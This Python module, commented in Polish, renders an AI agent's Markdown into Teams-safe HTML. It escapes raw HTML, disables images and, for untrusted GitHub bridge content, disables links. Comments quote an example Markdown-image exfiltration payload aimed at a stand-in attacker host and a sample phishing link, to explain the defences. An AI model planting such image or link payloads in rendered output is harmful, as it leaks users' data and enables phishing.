"""Render Markdown → HTML dla Teams — kierunek WYJŚCIOWY, WSPÓLNY dla inbound i outbound.

Model agenta emituje Markdown (``**pogrubienie**``, ``### nagłówek``, listy). Graph
przy odpowiedzi na kanale przyjmuje ``contentType: "html"``, więc TU zamieniamy Markdown
na podzbiór HTML renderowany przez Teams (``<strong>``/``<em>``, ``<ul>/<ol>/<li>``,
``<h1>``–``<h6>``, ``<pre>/<code>``, ``<a>``, ``<blockquote>``, ``<p>``, ``<br>``,
``<table>``, ``<s>``).

Czego tu ŚWIADOMIE NIE MA i dlaczego — żeby nie szukać tego drugi raz: obrazki są wyłączone
(wyprowadzenie danych przez ``<img src>``, patrz niżej), surowy HTML jest escapowany (treść to
DANE), a ``linkify`` (gołe adresy jako żywe linki) jest tu ZBĘDNY: zmierzone na żywo 2026-08-21 —
Teams sam robi z gołego adresu klikalny odnośnik. Gdyby ktoś chciał go mimo to włączyć:
reguła wymaga pakietu ``linkify-it-py``, którego w obrazie NIE MA, a ``enable("linkify")``
bez niego RZUCA i zdegradowałoby cały render do zescapowanego tekstu — czyli lekarstwo
gorsze od choroby.
Dopełnia ``teams_graph/selection._strip_html`` (kierunek WEJŚCIOWY, zdejmowanie HTML z
wiadomości przychodzących) o render w kierunku WYJŚCIOWYM.

Żyje na poziomie ``adapters/`` (nie ``inbound/`` ani ``outbound/``), bo obie strony go
importują: drzwi ``teams_graph`` (inbound, odpowiedź agenta) i ``graph_teams_notifier``
(outbound, push zdarzeń mostu) — trzymanie go w ``inbound/`` łamało regułę
``adapters.outbound ↛ adapters.inbound``. ``teams_graph/formatting.py`` re-eksportuje stąd
dla wstecznej zgodności importów.

Biblioteka ``markdown-it-py`` (extra ``teams-graph``) importowana LENIWIE — sam import
tego modułu nie wymaga extra. Każdy błąd renderu (w tym brak biblioteki) DEGRADUJE do
zescapowanego tekstu (filozofia ADR 0016: egress nigdy nie kładzie pollera).
"""

from __future__ import annotations

import html
import logging

logger = logging.getLogger(__name__)


def to_teams_html(markdown_text: str, *, allow_links: bool = True) -> str:
    """Zamień Markdown agenta na HTML renderowany przez Teams; degraduj przy błędzie.

    ``allow_links`` — czy renderować markdownowe linki ``[tekst](url)``. Domyślnie ``True`` (wyjście
    AGENTA jest zaufane). Dla powiadomień MOSTU (treść zdarzeń z GitHuba, niezaufana) ustawiamy
    ``False``: ``[Kliknij](https://atakujący)`` w tytule issue nie może stać się żywym linkiem
    (phishing) — schodzi jako tekst, a prawdziwy odnośnik i tak jest w wiadomości osobno.
    """
    try:
        from markdown_it import MarkdownIt
    except Exception:  # brak extra teams-graph albo błąd ładowania — nie wywracaj wysyłki
        logger.warning("markdown-it-py niedostępny — wysyłam tekst zescapowany, bez formatowania.")
        return _escape_fallback(markdown_text)

    try:
        # html=False: surowy HTML w treści modelu to DANE — escapujemy, nie przepuszczamy.
        #
        # breaks=True, bo to jest CZAT, nie dokument. Preset commonmark zwija pojedynczy znak
        # nowej linii do spacji, więc każdy blok pisany linia-po-linii docierał jako jedno
        # zdanie ciągiem. To ta sama przyczyna, dla której tabela bez reguły `table` schodziła
        # nieczytelna: cały blok lądował w JEDNYM ``<p>``, a Teams zwija w nim znaki nowej linii.
        renderer = MarkdownIt("commonmark", {"html": False, "breaks": True})
        # Wyłącz obrazki: treść notatek/wiadomości to niezaufane DANE, a wstrzyknięty
        # `![](https://atakujący/?d=...)` stałby się żywym <img src> — Teams mógłby go
        # pobrać, wyprowadzając dane. Markdown obrazka schodzi jako tekst (jak tabele).
        renderer.disable("image")
        # Tabele: ZMIERZONE NA ŻYWO 2026-08-21 w wątku kanału (wiadomość techniczna wysłana tą
        # samą drogą co odpowiedź agenta) — Teams renderuje ``<table>`` poprawnie. Wcześniejszy
        # komentarz twierdził coś odwrotnego („renderuje niekonsekwentnie") i nie stał za nim
        # ani ADR, ani pomiar; kontrprzykład leżał zresztą w tym samym repo, bo
        # ``send_chat_html`` powstał WŁAŚNIE po to, żeby dostarczyć do Teams prawdziwą tabelę.
        renderer.enable("table")
        renderer.enable("strikethrough")  # `~~x~~` docierało jako tyldy
        if not allow_links:
            renderer.disable("link")  # niezaufana treść mostu — linki jako tekst (anty-phishing)
        return renderer.render(markdown_text)
    except Exception:  # renderer nie powinien rzucać, ale egress musi być odporny
        logger.exception("Render Markdown→HTML nie powiódł się — degraduję do tekstu.")
        return _escape_fallback(markdown_text)


def _escape_fallback(text: str) -> str:
    """Bezpieczny plain text jako HTML: zescapuj znaki i zamień nowe linie na ``<br>``."""
    return html.escape(text).replace("\n", "<br>")
